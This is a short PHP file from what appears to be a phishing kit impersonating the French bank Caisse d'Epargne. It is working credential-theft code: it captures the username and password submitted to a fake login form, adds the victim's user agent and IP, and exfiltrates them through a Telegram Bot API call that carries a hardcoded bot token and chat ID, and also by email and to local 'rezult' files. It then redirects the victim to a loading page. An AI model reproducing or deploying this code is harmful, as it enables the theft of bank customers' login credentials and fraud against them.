<?php
/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/


if(isset($_POST['username']) && isset($_POST['inputPassword'])){
if(!empty($_POST['username']) && !empty($_POST['inputPassword'])){
	include '../../config.php';
	include 'funcs.php';
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$user = $_POST['username'];
	$password = $_POST['inputPassword'];
	$message = "\nID : $user\nPWD : $password\nAgent: $agent\nIp: $ip";
	$suj = "Caisse D'epargne - LOGIN FROM $ip";
	toTG($message);
	mail($to,$suj,$message);
	$op = fopen($resText,'a+');
	fwrite($op,$message);
	fclose($op);
$token = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2039615741&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

	header("Location:  loading.html");
	
}
?>